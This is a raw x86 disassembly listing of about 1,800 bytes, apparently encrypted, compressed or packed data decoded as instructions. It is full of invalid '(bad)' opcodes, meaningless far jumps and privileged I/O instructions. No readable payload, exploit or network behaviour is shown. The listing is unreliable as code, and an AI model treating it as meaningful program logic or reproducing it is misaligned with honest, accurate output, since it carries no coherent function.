  4116b5:	jns    0x411690
  4116b7:	pop    esp
  4116b8:	xor    DWORD PTR [eax],esp
  4116ba:	ror    BYTE PTR [edi+0x4],0xb9
  4116be:	add    ebp,DWORD PTR [ebp+0x60]
  4116c1:	mov    ecx,0x245147d
  4116c6:	xchg   edi,eax
  4116c7:	mov    ds:0x3eb3aedd,eax
  4116cc:	ss pusha 
  4116ce:	aad    0x65
  4116d0:	pop    esi
  4116d1:	outs   dx,DWORD PTR ds:[esi]
  4116d2:	scas   eax,DWORD PTR es:[edi]
  4116d3:	retf   
  4116d4:	imul   eax,DWORD PTR [edx],0x70
  4116d7:	mov    ds:0x3de66ed9,al
  4116dc:	fnstcw WORD PTR [esi]
  4116de:	mov    ds:0x37608cc5,al
  4116e3:	clc    
  4116e4:	(bad)  
  4116e5:	jae    0x41167c
  4116e7:	pop    edx
  4116e8:	jl     0x4116a5
  4116ea:	addr16 nop
  4116ec:	cmp    cl,BYTE PTR [ecx-0x11e7d1f0]
  4116f2:	pop    esi
  4116f3:	pop    ecx
  4116f4:	lods   eax,DWORD PTR ds:[esi]
  4116f5:	dec    esi
  4116f6:	pop    ebx
  4116f7:	pop    ss
  4116f8:	scas   al,BYTE PTR es:[edi]
  4116f9:	hlt    
  4116fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116fb:	mov    eax,ds:0x8a116da3
  411700:	xchg   BYTE PTR [eax-0x115350a0],dl
  411706:	jae    0x41171f
  411708:	rcr    BYTE PTR [edi+eax*1],1
  41170b:	lea    edi,[edx+0xdc41d3e]
  411711:	inc    ebx
  411712:	cmp    esi,ebx
  411714:	xor    DWORD PTR [ecx+0xd330614],ebx
  41171a:	cmp    BYTE PTR [edx+0x75d8439a],ah
  411720:	jge    0x411796
  411722:	jbe    0x41172b
  411724:	or     DWORD PTR [ecx+eiz*2+0x2bed5e5c],esp
  41172b:	adc    ebp,eax
  41172d:	stos   BYTE PTR es:[edi],al
  41172e:	inc    ecx
  41172f:	cmp    ebx,ebp
  411731:	xchg   esp,eax
  411732:	cli    
  411733:	mov    ebx,0x18a9c065
  411738:	test   BYTE PTR [eax],al
  41173a:	cmp    ecx,DWORD PTR [ebx]
  41173c:	nop
  41173d:	cmc    
  41173e:	int    0xe9
  411740:	mov    ecx,0xec2e6e80
  411745:	stos   BYTE PTR es:[edi],al
  411746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411747:	lock pop esp
  411749:	neg    DWORD PTR [ecx]
  41174b:	lock push esi
  41174d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41174f:	(bad)  
  411750:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411752:	jbe    0x4116ec
  411754:	adc    DWORD PTR [edx],0x9e6bf68d
  41175a:	imul   eax,DWORD PTR [esi],0xffffff8c
  41175d:	loopne 0x4116e1
  41175f:	arpl   WORD PTR [ebp+edi*1-0x2e6a8419],di
  411766:	pop    ebx
  411767:	adc    ch,dl
  411769:	fcmovnb st,st(2)
  41176b:	outs   dx,DWORD PTR ds:[esi]
  41176c:	mov    cl,BYTE PTR [edx]
  41176e:	adc    eax,0xc8948188
  411773:	xor    al,0xc8
  411775:	jnp    0x411734
  411777:	jnp    0x41176e
  411779:	cmp    BYTE PTR [esi-0x51],dh
  41177c:	pop    ebx
  41177d:	pop    esi
  41177e:	ret    0xc5de
  411781:	out    0xb4,eax
  411783:	ss pusha 
  411785:	inc    esp
  411786:	push   ecx
  411787:	jbe    0x41175f
  411789:	ret    0xd1ff
  41178c:	mov    ecx,0xc0297f48
  411791:	in     al,dx
  411792:	xor    bh,BYTE PTR [edx]
  411794:	pop    ebp
  411795:	repz xor dl,BYTE PTR [eax]
  411798:	xor    al,0xe
  41179a:	mov    ss,WORD PTR [esi+0x69c81727]
  4117a0:	or     dl,bh
  4117a2:	or     BYTE PTR [eax+0x60],al
  4117a5:	or     eax,0xadac5527
  4117aa:	mov    cl,0x67
  4117ac:	xchg   ebp,eax
  4117ad:	xchg   ecx,eax
  4117ae:	jmp    0xa2e8af1a
  4117b3:	popf   
  4117b4:	div    DWORD PTR [edi]
  4117b6:	and    ch,BYTE PTR [esi+0x13914fb9]
  4117bc:	push   0xffffff9b
  4117be:	and    eax,0x5abfbd15
  4117c3:	aas    
  4117c4:	loopne 0x41181a
  4117c6:	leave  
  4117c7:	mov    eax,0x6831162d
  4117cc:	aam    0x41
  4117ce:	sub    eax,0x17ae3f45
  4117d3:	shl    DWORD PTR [eax],cl
  4117d5:	iret   
  4117d6:	es icebp 
  4117d8:	pop    ss
  4117d9:	arpl   WORD PTR [eax+0x7722b638],bx
  4117df:	inc    edi
  4117e0:	jo     0x4117e1
  4117e2:	mov    al,ds:0xb8491232
  4117e7:	loopne 0x411818
  4117e9:	xchg   ebp,eax
  4117ea:	fdiv   QWORD PTR [edi+0x1eb789e5]
  4117f0:	aas    
  4117f1:	cmc    
  4117f2:	push   es
  4117f3:	push   ecx
  4117f4:	lahf   
  4117f5:	push   esi
  4117f6:	cdq    
  4117f7:	fdivrp st(7),st
  4117f9:	push   eax
  4117fa:	push   edi
  4117fb:	call   0x95eaa371
  411800:	push   esi
  411801:	jnp    0x411822
  411803:	mov    esp,0x10d09522
  411808:	add    eax,0x23127a0f
  41180d:	jne    0x4117b7
  41180f:	mov    ebp,0x91425a4
  411814:	adc    eax,0x1f650cf6
  411819:	fld    st(1)
  41181b:	xchg   ebp,eax
  41181c:	rcl    BYTE PTR [ebx+0x39],1
  41181f:	sbb    al,0x45
  411821:	mov    bl,0x79
  411823:	jnp    0x411881
  411825:	mov    ds:0xd0fc1743,eax
  41182a:	cmp    cl,0x3e
  41182d:	iret   
  41182e:	jb     0x41183c
  411830:	pop    eax
  411831:	clc    
  411832:	fstp   TBYTE PTR [ebx+0x48]
  411835:	(bad)  
  411836:	fcom   DWORD PTR [eax-0x11adcc4f]
  41183c:	mov    eax,ds:0x1007e7d6
  411841:	inc    edx
  411842:	out    0x5,eax
  411844:	call   0x4d40e047
  411849:	mov    ah,BYTE PTR [ebx+0x1f]
  41184c:	dec    esp
  41184d:	dec    ebp
  41184e:	dec    edx
  41184f:	jge    0x4117d7
  411851:	imul   edi,DWORD PTR ds:0x5aab90c,0xb535018e
  41185b:	test   BYTE PTR [ecx+edx*2+0x5f],dl
  41185f:	adc    DWORD PTR [edi-0x8],eax
  411862:	mov    cl,0xaa
  411864:	scas   al,BYTE PTR es:[edi]
  411865:	aas    
  411866:	sbb    BYTE PTR [eax+eiz*1-0x57f1defd],ch
  41186d:	fnstcw WORD PTR [edi-0x69]
  411870:	cwde   
  411871:	leave  
  411872:	and    eax,0x7a83e47c
  411877:	cmp    bl,ah
  411879:	outs   dx,WORD PTR ds:[esi]
  41187b:	enter  0x15ab,0x57
  41187f:	mov    edi,ebx
  411881:	jl     0x41184d
  411883:	push   ds
  411884:	aas    
  411885:	push   edi
  411886:	jl     0x41187a
  411888:	jmp    0x491c:0x2755482b
  41188f:	push   edi
  411890:	shl    dh,cl
  411892:	pop    esi
  411893:	pusha  
  411894:	push   DWORD PTR ds:0x7934e39b
  41189a:	sbb    BYTE PTR [ebp+0x3983b34b],0x1
  4118a1:	mov    esi,cs
  4118a3:	js     0x41186f
  4118a5:	gs pusha 
  4118a7:	mov    ds:0x3baf1a4,eax
  4118ac:	retf   
  4118ad:	xor    eax,0xf067b598
  4118b2:	mov    ah,0xf0
  4118b4:	cmp    DWORD PTR [eax],0xffdac8d7
  4118ba:	fsubr  DWORD PTR [ecx+0x72]
  4118bd:	and    DWORD PTR [esi+0x11],edx
  4118c0:	imul   esp,DWORD PTR [esi-0x305f9789],0xd4023b7f
  4118ca:	mov    bl,0x84
  4118cc:	add    esi,DWORD PTR [esi-0x4531df00]
  4118d2:	lods   al,BYTE PTR ds:[esi]
  4118d3:	rcl    BYTE PTR [ebp+0x4c],0x21
  4118d7:	mov    ah,0x85
  4118d9:	fcmove st,st(2)
  4118db:	xchg   esp,eax
  4118dc:	call   0x70e8:0xcc18f8ce
  4118e3:	cmp    al,0x67
  4118e5:	push   es
  4118e6:	push   esp
  4118e7:	je     0x4118c6
  4118e9:	les    ebx,FWORD PTR [ebp+0x4d]
  4118ec:	cwde   
  4118ed:	cwde   
  4118ee:	sub    dl,BYTE PTR [ecx]
  4118f0:	mov    dl,0xf0
  4118f2:	call   0x3081b9a8
  4118f7:	(bad)  
  4118f8:	loope  0x41187e
  4118fa:	fisubr WORD PTR [eax]
  4118fc:	adc    esi,ebp
  4118fe:	push   ebp
  4118ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411900:	push   0x697557c0
  411905:	and    BYTE PTR ds:[ebx],dl
  411908:	jb     0x411890
  41190a:	ins    BYTE PTR es:[edi],dx
  41190b:	cdq    
  41190c:	popa   
  41190d:	(bad)  
  41190e:	repnz (bad) 
  411910:	popf   
  411911:	add    esi,esp
  411913:	jne    0x411907
  411915:	outs   dx,BYTE PTR ds:[esi]
  411916:	pop    esp
  411917:	mov    edx,0xf6b21a7f
  41191c:	out    0xd3,al
  41191e:	ss jecxz 0x411998
  411921:	clc    
  411922:	div    BYTE PTR cs:[ebx]
  411925:	popa   
  411926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411927:	into   
  411928:	xor    DWORD PTR [edx+0x508810ae],esi
  41192e:	sub    eax,0x671a6f6d
  411933:	add    bl,ah
  411935:	and    al,dl
  411937:	dec    edx
  411938:	aad    0x7e
  41193a:	mul    DWORD PTR [edx+0x2869518d]
  411940:	xchg   esp,eax
  411941:	(bad)  
  411942:	ds xchg esi,eax
  411944:	(bad)  
  411945:	xchg   edi,eax
  411946:	lahf   
  411947:	ins    DWORD PTR es:[edi],dx
  411948:	mov    esp,0x2a2bbe99
  41194d:	pop    ss
  41194e:	push   ebx
  41194f:	or     edx,DWORD PTR [ebx+0x55]
  411952:	and    BYTE PTR [edi+edi*8+0x19],0xe9
  411957:	mov    ecx,0xe7670303
  41195c:	ret    0x4be5
  41195f:	fld    QWORD PTR [edx]
  411961:	push   edx
  411962:	(bad)  [ebx-0x54d48257]
  411968:	jne    0x4118fe
  41196a:	lds    ebx,FWORD PTR [ecx-0x8]
  41196d:	pop    edx
  41196e:	outs   dx,BYTE PTR ds:[esi]
  41196f:	pusha  
  411970:	jns    0x4119b1
  411972:	in     eax,0x4e
  411974:	fsubr  QWORD PTR [ebx+ebp*8+0x57]
  411978:	inc    edx
  411979:	mov    bl,0xb5
  41197b:	aam    0xb8
  41197d:	mov    bl,0x41
  41197f:	loope  0x4119b9
  411981:	mov    bh,0xea
  411983:	data16 xor BYTE PTR [ebx],bl
  411986:	ins    BYTE PTR es:[edi],dx
  411987:	mov    al,cl
  411989:	add    esp,esp
  41198b:	mov    cl,0x72
  41198d:	jmp    0x411957
  41198f:	test   DWORD PTR [esi-0x32da116d],0x2b990795
  411999:	scas   eax,DWORD PTR es:[edi]
  41199a:	outs   dx,DWORD PTR ds:[esi]
  41199b:	fstp   QWORD PTR [edi-0x44]
  41199e:	mov    edx,fs
  4119a0:	cdq    
  4119a1:	sti    
  4119a2:	dec    ecx
  4119a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119a4:	adc    cl,BYTE PTR [eax+0x22c151c3]
  4119aa:	push   0x3b69fb57
  4119af:	aas    
  4119b0:	mov    ah,0xf2
  4119b2:	or     dl,bl
  4119b4:	bound  edi,QWORD PTR [ebx+0x27ba2976]
  4119ba:	das    
  4119bb:	rcr    BYTE PTR [edi+0x755e9f27],cl
  4119c1:	scas   al,BYTE PTR es:[edi]
  4119c2:	mov    DWORD PTR [edx-0xe],0xab90cd70
  4119c9:	jnp    0x411979
  4119cb:	pcmpeqd mm7,mm2
  4119ce:	lods   eax,DWORD PTR ds:[esi]
  4119cf:	ins    DWORD PTR es:[edi],dx
  4119d0:	xchg   esp,eax
  4119d1:	lock lock push edi
  4119d4:	fidiv  DWORD PTR [esi+esi*4+0x3e]
  4119d8:	adc    BYTE PTR [ebx+0x7c71bbec],ch
  4119de:	dec    edx
  4119df:	mov    esp,0x52868c9d
  4119e4:	pushf  
  4119e5:	enter  0x9383,0xc5
  4119e9:	mov    DWORD PTR [eax+0x41],0x4cce2496
  4119f0:	push   0x5d0c87bd
  4119f5:	adc    eax,0xbe7f9d48
  4119fa:	fist   DWORD PTR [ecx]
  4119fc:	cs retf 0x9a13
  411a00:	dec    esi
  411a01:	mov    cl,0x59
  411a03:	sbb    BYTE PTR [ecx],dh
  411a05:	mov    DWORD PTR [edx],0xfcc51292
  411a0b:	push   esi
  411a0c:	jle    0x411a24
  411a0e:	mov    edi,0xc7545e1d
  411a13:	cmp    dl,dh
  411a15:	outs   dx,DWORD PTR ds:[esi]
  411a16:	(bad)  
  411a17:	pop    ss
  411a18:	mov    esi,0x5bf3e1af
  411a1d:	cmp    BYTE PTR [edi+0x74a76524],dh
  411a23:	pop    esi
  411a24:	mov    dl,0xf3
  411a26:	lea    esp,[eax+0x29]
  411a29:	ja     0x411a9b
  411a2b:	ins    BYTE PTR es:[edi],dx
  411a2c:	inc    eax
  411a2d:	std    
  411a2e:	rol    DWORD PTR [ebp+0x275c73ff],1
  411a34:	adc    bh,BYTE PTR [edx+0x7e]
  411a37:	mov    ch,0x47
  411a39:	mov    edx,0x92eaf447
  411a3e:	pop    ds
  411a3f:	retf   0x9f30
  411a42:	fstp   st(5)
  411a44:	(bad)  
  411a45:	mov    esi,0x7deefb3e
  411a4a:	pushf  
  411a4b:	enter  0x3ad9,0xd7
  411a4f:	mov    eax,ds
  411a51:	jbe    0x411ac9
  411a53:	(bad)  
  411a54:	mov    esi,0x493b9f3d
  411a59:	cmc    
  411a5a:	repz sbb ch,ah
  411a5d:	in     eax,0x3b
  411a5f:	or     BYTE PTR [ebx],0x1d
  411a62:	pop    ds
  411a63:	pusha  
  411a64:	lds    eax,FWORD PTR [edx]
  411a66:	pop    edi
  411a67:	fxch   st(1)
  411a69:	sbb    ebx,DWORD PTR [edx+0x65]
  411a6c:	adc    al,0xb0
  411a6e:	stc    
  411a6f:	js     0x411ae9
  411a71:	sub    bl,BYTE PTR [edi+eiz*1-0x80]
  411a75:	inc    esp
  411a76:	mov    al,0xe7
  411a78:	leave  
  411a79:	retf   
  411a7a:	xor    eax,0xdd50676d
  411a7f:	push   esp
  411a80:	in     eax,0x10
  411a82:	shl    DWORD PTR [ebx],1
  411a84:	jne    0x411ad6
  411a86:	push   0xaf60b576
  411a8b:	mov    cl,0x16
  411a8d:	and    DWORD PTR [edi],ebx
  411a8f:	bound  ebx,QWORD PTR [ebp+0x5e337ad6]
  411a95:	lahf   
  411a96:	loope  0x411ab1
  411a98:	inc    ebx
  411a99:	adc    dl,BYTE PTR [esi]
  411a9b:	xor    al,0x11
  411a9d:	loopne 0x411a65
  411a9f:	out    dx,al
  411aa0:	mov    edi,0x37e5d57f
  411aa5:	mov    ebp,0xc5c94824
  411aaa:	dec    eax
  411aab:	(bad)  
  411aac:	sub    eax,0x1a
  411aaf:	arpl   WORD PTR [edx-0xc1156b1],dx
  411ab5:	push   ds
  411ab6:	mov    ch,0x56
  411ab8:	js     0x411abf
  411aba:	jl     0x411ad6
  411abc:	or     bh,BYTE PTR [edx]
  411abe:	xchg   ebx,eax
  411abf:	xchg   esp,eax
  411ac0:	cdq    
  411ac1:	repnz fsub st,st(4)
  411ac4:	stos   BYTE PTR es:[edi],al
  411ac5:	aam    0x95
  411ac7:	(bad)  
  411ac8:	mov    dl,0x6a
  411aca:	cmp    DWORD PTR [esi],esp
  411acc:	out    0xa8,al
  411ace:	sbb    al,0x28
  411ad0:	mov    esi,0xadafe52e
  411ad5:	cmp    ah,BYTE PTR [ebp+0x3bf1fd2f]
  411adb:	fst    DWORD PTR [edi]
  411add:	add    al,0x29
  411adf:	repnz std 
  411ae1:	add    eax,0x11e352b3
  411ae6:	jne    0x411a8d
  411ae8:	xor    al,0x9c
  411aea:	pop    eax
  411aeb:	js     0x411ad6
  411aed:	cmp    al,0xe7
  411aef:	ds xor al,0xd8
  411af2:	mov    eax,ds:0x28fc5d1f
  411af7:	test   BYTE PTR [ebp+0x165bf41c],0xe0
  411afe:	loopne 0x411ac1
  411b00:	retf   
  411b01:	icebp  
  411b02:	sbb    eax,0xcbdfa0d7
  411b07:	popf   
  411b08:	retf   0x61db
  411b0b:	ins    DWORD PTR es:[edi],dx
  411b0c:	inc    esp
  411b0d:	imul   DWORD PTR [edi]
  411b0f:	xchg   ebp,eax
  411b10:	idiv   BYTE PTR [edx+0x60d64c2c]
  411b16:	sub    eax,0xc848912f
  411b1b:	inc    edi
  411b1c:	loope  0x411b74
  411b1e:	xchg   BYTE PTR [ebx],bl
  411b20:	add    al,BYTE PTR [bx+di-0x127b]
  411b25:	js     0x411ae9
  411b27:	(bad)  
  411b28:	clc    
  411b29:	xchg   ebx,eax
  411b2a:	(bad)  
  411b2b:	fist   WORD PTR ds:0x37a2519c
  411b31:	pop    ecx
  411b32:	pop    ebx
  411b33:	mov    dh,0x6f
  411b35:	mov    bh,0x8f
  411b37:	stc    
  411b38:	addr16 stc 
  411b3a:	and    al,0x89
  411b3c:	pop    eax
  411b3d:	cmp    al,0x79
  411b3f:	(bad)  
  411b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b42:	or     ebx,DWORD PTR [ecx+eiz*2]
  411b45:	cdq    
  411b46:	and    ecx,DWORD PTR [eax+0x47a271b2]
  411b4c:	jmp    0x411bb0
  411b4e:	dec    edi
  411b4f:	add    al,0x76
  411b51:	(bad)  
  411b53:	dec    eax
  411b54:	pop    ebp
  411b55:	sti    
  411b56:	les    edx,FWORD PTR ds:0x3b1fa911
  411b5c:	adc    edx,eax
  411b5e:	adc    ebp,ebx
  411b60:	adc    al,dl
  411b62:	add    esi,DWORD PTR [eax-0x3af34687]
  411b68:	pusha  
  411b69:	cli    
  411b6a:	mov    ds:0x725ac3ad,eax
  411b6f:	and    ebx,0x61
  411b72:	xchg   ebx,eax
  411b73:	xor    ebp,DWORD PTR [eax+0x1dd0e504]
  411b79:	mov    ?,esi
  411b7b:	shr    DWORD PTR [edi],cl
  411b7d:	mov    BYTE PTR [ebx+0xa],bl
  411b80:	xor    BYTE PTR [edi-0x1],al
  411b83:	sti    
  411b84:	aam    0x2a
  411b86:	adc    DWORD PTR [ebp-0x2bfc7a8b],0xffffffc4
  411b8d:	lahf   
  411b8e:	sbb    cl,BYTE PTR [eax+esi*4+0x1023ac55]
  411b95:	dec    ebx
  411b96:	xchg   ecx,eax
  411b97:	repnz push 0x2c
  411b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b9b:	mov    ecx,0xc939d59f
  411ba0:	pop    esi
  411ba1:	cmp    eax,0x3efe2f5d
  411ba6:	jmp    0x44a4:0xe3b5788f
  411bad:	add    al,0xf5
  411baf:	jle    0x411b92
  411bb1:	repnz sub DWORD PTR [ebx-0x3f674be4],edi
  411bb8:	repnz and al,0xa2
  411bbb:	or     DWORD PTR [edi],ebx
  411bbd:	pop    ebp
  411bbe:	repz add DWORD PTR [ecx+0x2e],esp
  411bc2:	push   es
  411bc3:	dec    ebp
  411bc4:	xor    eax,0xfaabc57b
  411bc9:	xchg   esp,eax
  411bca:	cwde   
  411bcb:	ret    
  411bcc:	xor    al,0x31
  411bce:	sub    DWORD PTR [edi-0x28],ecx
  411bd1:	pop    ebx
  411bd2:	push   edx
  411bd3:	dec    esp
  411bd4:	xchg   edi,eax
  411bd5:	int3   
  411bd6:	sbb    DWORD PTR [esi+0x7cedd8c3],ebx
  411bdc:	ja     0x411be7
  411bde:	daa    
  411bdf:	in     al,0x1d
  411be1:	jnp    0x411bda
  411be3:	mov    ch,0x58
  411be5:	cs jbe 0x411bd0
  411be8:	scas   eax,DWORD PTR es:[edi]
  411be9:	test   DWORD PTR [eax-0x35d636f2],esp
  411bef:	(bad)  
  411bf1:	das    
  411bf2:	cmc    
  411bf3:	rcl    DWORD PTR [esi-0x5a4db324],0xcf
  411bfa:	scas   eax,DWORD PTR es:[edi]
  411bfb:	sub    ebp,0xffffffc3
  411bfe:	sub    BYTE PTR [ebx],dl
  411c00:	into   
  411c01:	xchg   ebp,esp
  411c03:	cmc    
  411c04:	xor    bh,BYTE PTR [ecx+0x5e]
  411c07:	sub    bl,BYTE PTR [eax]
  411c09:	sbb    DWORD PTR [edi-0x3],0x367020b2
  411c10:	out    dx,eax
  411c11:	jns    0x411bbd
  411c13:	dec    edi
  411c14:	push   esp
  411c15:	int    0xee
  411c17:	test   BYTE PTR [ecx-0x60ed3b81],ch
  411c1d:	dec    ecx
  411c1e:	xchg   ecx,eax
  411c1f:	(bad)
  411c23:	imul   esp,DWORD PTR [ebx+0x3c],0xffffffb8
  411c27:	bound  edx,QWORD PTR [ebx]
  411c29:	out    0xfe,al
  411c2b:	jnp    0x411c24
  411c2d:	into   
  411c2e:	xor    al,0x21
  411c30:	ds add al,0x50
  411c33:	(bad)  
  411c34:	cmp    al,BYTE PTR [ebp+0x40]
  411c37:	aad    0xf2
  411c39:	fst    QWORD PTR [edx]
  411c3b:	(bad)  
  411c3e:	mov    dl,0x56
  411c40:	stc    
  411c41:	inc    edi
  411c42:	mul    esp
  411c44:	pop    ss
  411c45:	test   ebp,ecx
  411c47:	sub    eax,0x8440fdad
  411c4c:	dec    edi
  411c4d:	dec    esp
  411c4e:	nop
  411c4f:	outs   dx,DWORD PTR ds:[esi]
  411c50:	mov    dh,0xf0
  411c52:	mov    esi,0xc0960fe5
  411c57:	fwait
  411c58:	mov    ah,0x4e
  411c5a:	xor    ebx,DWORD PTR ds:0xd2ec7df8
  411c60:	(bad)  
  411c61:	jmp    0x479:0x37f7ecf
  411c68:	inc    ebp
  411c69:	mov    eax,ds:0x15c3d1f
  411c6e:	jns    0x411ce3
  411c70:	inc    eax
  411c71:	(bad)  
  411c72:	(bad)  
  411c73:	(bad)  
  411c74:	xor    esi,DWORD PTR [ecx]
  411c76:	pusha  
  411c77:	sub    al,0xa1
  411c79:	clc    
  411c7a:	lds    eax,FWORD PTR [ebp+0x4f44982]
  411c80:	jne    0x411c3a
  411c82:	push   edi
  411c83:	dec    ecx
  411c84:	adc    BYTE PTR [ecx],dh
  411c86:	inc    edi
  411c87:	shl    BYTE PTR ds:0x2da6682a,0x74
  411c8e:	dec    edi
  411c8f:	cs jne 0x411d03
  411c92:	or     al,0xbd
  411c94:	les    esp,FWORD PTR [eax-0x14466933]
  411c9a:	mov    BYTE PTR [edi+0x77885786],dh
  411ca0:	fsub   QWORD PTR [ebp-0x79]
  411ca3:	xchg   esp,eax
  411ca4:	mov    ebx,DWORD PTR [edi+0x360a5d41]
  411caa:	inc    esi
  411cab:	int    0x56
  411cad:	fld    st(3)
  411caf:	mov    al,0x60
  411cb1:	das    
  411cb2:	pusha  
  411cb3:	ror    BYTE PTR [ecx],1
  411cb5:	outs   dx,DWORD PTR ds:[esi]
  411cb6:	add    eax,0x9998d6c5
  411cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cbc:	mov    ah,dl
  411cbe:	inc    eax
  411cbf:	and    BYTE PTR [edi-0x2560e1e6],bl
  411cc5:	and    eax,DWORD PTR [esi-0x844088a]
  411ccb:	cdq    
  411ccc:	and    al,0xf1
  411cce:	mov    ecx,0x98c272f2
  411cd3:	movd   DWORD PTR [ecx],mm2
  411cd6:	clc    
  411cd7:	sar    DWORD PTR [edx-0x4f8a5b6d],1
  411cdd:	popa   
  411cde:	rcl    DWORD PTR [esi-0x523f2dfd],1
  411ce4:	retf   
  411ce5:	cmp    BYTE PTR [ecx],ah
  411ce7:	sbb    al,0x5f
  411ce9:	push   es
  411cea:	mov    ebp,DWORD PTR [edx+0x2258ddc5]
  411cf0:	inc    ecx
  411cf1:	fs and eax,0x83179641
  411cf7:	xor    DWORD PTR [esi+ebp*1],0x4844511d
  411cfe:	xor    cl,BYTE PTR [eax]
  411d00:	mov    bh,0xb5
  411d02:	ins    BYTE PTR es:[edi],dx
  411d03:	mov    eax,0x60137721
  411d08:	pop    eax
  411d09:	fldcw  WORD PTR [edx+0x38]
  411d0c:	pop    esp
  411d0d:	push   cs
  411d0e:	xor    al,BYTE PTR [ecx]
  411d10:	mov    esi,DWORD PTR cs:[esi]
  411d13:	fimul  WORD PTR [esi+0x30]
  411d16:	dec    ebx
  411d17:	push   ss
  411d18:	cmp    eax,0xfee0bb9b
  411d1d:	les    eax,FWORD PTR [esi-0x1ee9f006]
  411d23:	sbb    eax,0x8ee50da6
  411d28:	sti    
  411d29:	inc    eax
  411d2a:	pop    ebp
  411d2b:	xor    ebx,0x185cb028
  411d31:	dec    edx
  411d32:	pushf  
  411d33:	pop    ds
  411d34:	inc    eax
  411d35:	xchg   ebp,eax
  411d36:	mov    edx,0xdf396df4
  411d3b:	ss jecxz 0x411d6d
  411d3e:	mov    DWORD PTR [ebp-0x2673bca9],edi
  411d44:	nop
  411d45:	mov    cl,0x38
  411d47:	in     eax,dx
  411d48:	jnp    0x411dc3
  411d4a:	inc    esi
  411d4b:	pop    es
  411d4c:	loopne 0x411d41
  411d4e:	or     eax,0xe1abd1c2
  411d53:	push   0x375e4035
  411d58:	stos   BYTE PTR es:[edi],al
  411d59:	mov    ah,0x20
  411d5b:	and    DWORD PTR [edx],esp
  411d5d:	and    eax,0x93e81a9a
  411d62:	test   al,0xe2
  411d64:	mov    eax,0x5e84d202
  411d69:	push   esp
  411d6a:	add    eax,DWORD PTR [esp+edx*2-0x2f]
  411d6e:	out    0x42,al
  411d70:	add    bh,BYTE PTR [eax]
  411d72:	in     al,0x69
  411d74:	fst    DWORD PTR ds:0xd41199c4
  411d7a:	mov    WORD PTR [ebx-0x1],?
  411d7d:	push   es
  411d7e:	outs   dx,BYTE PTR ds:[esi]
  411d7f:	mov    ah,0xd0
  411d81:	add    eax,0xab37dd67
  411d86:	pop    es
  411d87:	jo     0x411d15
  411d89:	mov    ecx,0x5ba6c233
  411d8e:	retf   
  411d8f:	sub    ebx,DWORD PTR [edx]
  411d91:	aad    0x7f
  411d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d94:	jle    0x411d5d
  411d96:	cwde   
  411d97:	adc    DWORD PTR [edi],ecx
  411d99:	push   ds
  411d9a:	mov    ecx,0x5ea32012
  411d9f:	sbb    cl,BYTE PTR [eax-0x60]
  411da2:	aad    0xc1
  411da4:	inc    ebp
  411da5:	sub    DWORD PTR [ebx+0x7b3cff8a],edi
  411dab:	or     BYTE PTR [ebx],dh
  411dad:	in     al,0x1b
  411daf:	jae    0x411d3c
  411db1:	xor    esp,DWORD PTR [ebp-0x4c]
  411db4:	xchg   cl,dl
  411db6:	adc    DWORD PTR [edi+0x5],ecx
  411db9:	mov    eax,0x457f22ed
  411dbe:	fs xchg edx,eax
  411dc0:	xchg   edi,eax
  411dc1:	(bad)  
  411dc2:	fisubr WORD PTR [ecx-0xaed0660]
  411dc8:	aad    0x3d
  411dca:	in     al,0xaf
  411dcc:	push   ss
  411dcd:	cli    
  411dce:	adc    al,0xd1
  411dd0:	xchg   esi,eax
  411dd1:	mov    DWORD PTR [esi],esp
  411dd3:	adc    BYTE PTR [edx+0x7dd872e8],dh
  411dd9:	jno    0x411db9
  411ddb:	fld    TBYTE PTR [edi-0xb]
  411dde:	pop    ds
  411ddf:	nop
  411de0:	mul    DWORD PTR [edi+0x3e]
  411de3:	pop    esp
  411de4:	pop    eax
  411de5:	jno    0x411e4c
  411de7:	and    DWORD PTR [edi],edi
  411de9:	cld    
  411dea:	inc    ebx
  411deb:	ds mov cl,0x29
  411dee:	xor    esp,esp
  411df0:	retf   
  411df1:	das    
  411df2:	add    DWORD PTR ds:0x781358e9,eax
  411df8:	aas    
  411df9:	pop    edi
  411dfa:	bound  edi,QWORD PTR [eax-0x6e38f1c8]
  411e00:	pop    DWORD PTR [edx-0x7b9312f8]
  411e06:	and    eax,ebx
  411e08:	xor    dh,BYTE PTR [eax]
  411e0a:	jbe    0x411e7d
  411e0c:	mov    ds:0xb66196bc,al
  411e11:	xor    edx,ecx
  411e13:	jb     0x411e7b
  411e15:	cmp    ah,BYTE PTR [ebp-0x615a2e03]
  411e1b:	adc    al,BYTE PTR [ebx+0x4ed2b535]
  411e21:	mov    DWORD PTR [ebp-0x22],ecx
  411e24:	es addr16 cdq 
  411e27:	out    0x36,al
  411e29:	mov    dl,0x11
  411e2b:	outs   dx,DWORD PTR ds:[esi]
  411e2c:	mov    eax,ds:0xe001f2c1
  411e31:	mov    BYTE PTR [edi+0x2a0821f4],dl
  411e37:	bnd jno 0x411e15
  411e3a:	ds pop ds
  411e3c:	push   cs
  411e3d:	into   
  411e3e:	and    eax,0x414a35f7
  411e43:	xor    BYTE PTR [ebp-0x3b],al
  411e46:	out    0x41,eax
  411e48:	mov    DWORD PTR [esi-0x80],ebx
  411e4b:	bound  ebx,QWORD PTR [ebp+0x4b3b0212]
  411e51:	out    dx,al
  411e52:	jp     0x411ebd
  411e54:	inc    esi
  411e55:	mov    dl,0x6a
  411e57:	xor    dh,ah
  411e59:	je     0x411e8f
  411e5b:	or     ch,BYTE PTR [eax]
  411e5d:	sbb    ebx,DWORD PTR [esi-0x7b3f5b55]
  411e63:	or     esp,DWORD PTR [eax+0x58]
  411e66:	int    0x1d
  411e68:	mov    DWORD PTR [esi-0x61],edx
  411e6b:	arpl   WORD PTR [edi],si
  411e6d:	mov    dl,0x64
  411e6f:	cld    
  411e70:	push   edx
  411e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e72:	(bad)  
  411e73:	jl     0x411e46
  411e75:	loopne 0x411e72
  411e77:	stc    
  411e78:	stc    
